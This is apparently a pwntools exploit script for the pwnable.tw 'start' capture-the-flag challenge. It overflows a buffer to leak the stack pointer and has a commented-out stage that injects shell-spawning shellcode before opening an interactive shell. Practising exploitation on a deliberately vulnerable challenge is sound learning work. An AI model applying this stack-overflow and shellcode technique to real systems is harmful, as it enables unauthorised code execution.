#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './start'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'chall.pwnable.tw', 10000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

offset = 20
payload = flat({offset: 0x08048087})
io.sendlineafter(b'CTF:', payload)

esp = unpack(io.recv(4))
info('esp: %#x', esp)

# sc = flat({offset: p32(esp+20) + asm(shellcraft.sh())})
# info('shellcode length: %#x', len(sc))
# io.sendline(sc)

io.interactive()